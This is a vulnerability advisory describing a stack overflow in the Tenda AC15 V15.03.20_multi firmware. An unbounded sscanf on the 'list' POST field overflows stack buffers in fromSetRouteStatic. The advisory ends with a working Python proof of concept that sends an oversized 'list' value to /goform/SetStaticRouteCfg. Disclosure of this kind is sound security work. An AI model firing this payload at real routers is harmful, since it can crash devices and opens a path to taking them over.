## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware has a stack overflow vulnerability in the `fromSetRouteStatic` function. The `v5` variable receives the `list` parameter from a POST request and is later assigned to function `sub_79180`. 

![image-20240314163102289](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314163102289.png)

In the `sub_79180` function, the `a2` (the value of `list`) is passed to `v16` and formatted by the `sscanf` function and in the form of `%[^,],%[^,],%[^,],%s`. This greedy matching mechanism is not secure, as long as the size of the data we enter is larger than the size of `v11, v10, v9, s1`, it will cause a stack overflow.

![image-20240314163714021](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314163714021.png)

![image-20240314163744934](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314163744934.png)

The user-provided `list` can trigger this security vulnerability.

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/SetStaticRouteCfg"
payload = "aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa,a,a,aa"

data = {"list": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240314163032951](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314163032951.png)